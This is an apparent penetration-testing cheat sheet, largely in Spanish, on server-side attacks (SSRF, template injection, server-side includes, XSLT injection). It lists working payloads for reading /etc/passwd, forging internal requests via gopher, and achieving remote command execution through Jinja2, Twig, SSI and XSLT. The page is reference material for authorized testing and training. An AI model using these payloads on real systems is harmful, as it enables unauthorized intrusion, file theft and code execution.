---
title: Server-Side Attacks (SSRF, SSTI, SSI, XSLT)
slug: server-side-attacks
category: techniques
updated: 2026-08-20
summary: "SSRF (file://, gopher POST/SMTP, blind port-scan), SSTI (identificar ${7*7}/{{7*7}}/{{7*'7'}}, Jinja2 __globals__ RCE, Twig filter('system')), SSI (<!--#exec-->), XSLT (php:function RCE)"
tags: [web, ssrf, ssti, ssi, xslt, rce, gopher, jinja2, twig]
sensitive: false
---

# Server-Side Attacks

## When to use
Parámetros donde el server actúa por nosotros: fetch de una URL (SSRF), render
de una plantilla con input reflejado (SSTI/SSI), o transformación XML (XSLT).
Camino frecuente a RCE / lectura de archivos internos. Hub: [[web-app-attacks]].

## SSRF (Server-Side Request Forgery)
Parámetro que el server usa para hacer una request (`dateserver=http://...`).
```bash
# Acceder a endpoints internos restringidos + fuzz vía SSRF
ffuf -w raft-small-words.txt -u http://TARGET/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://internal.htb/FUZZ.php&date=2024-01-01" -fr "Server at internal.htb Port 80"
# Leer archivos locales: esquema file://
dateserver=file:///etc/passwd
```
**gopher://** → enviar bytes arbitrarios a un socket TCP (POST interno, SMTP, Redis, MySQL…). Construir la request HTTP a mano, URL-encode `%20`/`%0D%0A`, prefijar `gopher://host:port/_`, y **doble-encodear** al meterla en el parámetro:
```
gopher://internal.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20internal.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```
`Gopherus` genera URLs gopher para MySQL/PostgreSQL/FastCGI/Redis/SMTP/Zabbix/memcache.

### Blind SSRF
No se ve la respuesta. Confirmar con `nc -lnvp 8000` + URL propia. Explotación limitada pero: **port-scan interno** y **detección de archivos** vía mensajes de error distintos (abierto/cerrado, existe/no). Servicios no-HTTP (MySQL) suelen no distinguirse.

## SSTI (Server-Side Template Injection)
**Confirmar**: inyectar `${{<%[%'"}}%\.` (rompe sintaxis → error).
**Identificar motor**: `${7*7}` → si NO ejecuta, probar `{{7*7}}` → si da 49, probar `{{7*'7'}}`: **Jinja=7777777**, **Twig=49**.

### Jinja2 (Python/Flask/Django)
```jinja2
{{ config.items() }}                                              # config + secret key
{{ self.__init__.__globals__.__builtins__ }}                     # builtins disponibles
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}   # LFI
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}  # RCE
```

### Twig (PHP/Symfony)
```twig
{{ _self }}                              # info de plantilla (limitada)
{{ "/etc/passwd"|file_excerpt(1,-1) }}   # LFI (filtro Symfony)
{{ ['id'] | filter('system') }}          # RCE
```
Cheatsheet: PayloadsAllTheThings/Server Side Template Injection.

## SSI (Server-Side Includes)
Páginas `.shtml` con input reflejado sin sanitizar.
```
<!--#printenv -->            # confirma (vuelca env vars)
<!--#exec cmd="id" -->       # RCE
```

## XSLT Injection
App que transforma XML con XSLT e inserta input sin sanitizar. Confirmar con `<` (rompe → error).
```xml
<xsl:value-of select="system-property('xsl:version')" />          <!-- info: libxslt, v1.0 -->
<xsl:value-of select="unparsed-text('/etc/passwd','utf-8')" />    <!-- LFI (solo XSLT 2.0) -->
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />  <!-- LFI si PHP-funcs on -->
<xsl:value-of select="php:function('system','id')" />             <!-- RCE si PHP-funcs on -->
```

## Gotchas
- SSRF permite pivotar a la red interna → cualquier host interno alcanzado NO está en scope; parar y re-autorizar (ver [[scope]], [[network-pivoting]]).
- SSTI/SSI/XSLT → RCE en producción: probar con `id`/lectura, no con payloads destructivos; documentar.
- `{{7*'7'}}` es el oracle más limpio para separar Jinja de Twig.

## References
- Relacionado: [[web-app-attacks]], [[command-injection]], [[file-inclusion]], [[network-pivoting]], [[reverse-shells]]
- PayloadsAllTheThings (SSTI/SSRF). Curso CWES Bug Bounty → 03-WEB → "Server-side Attacks" (HTB Academy). Notion.
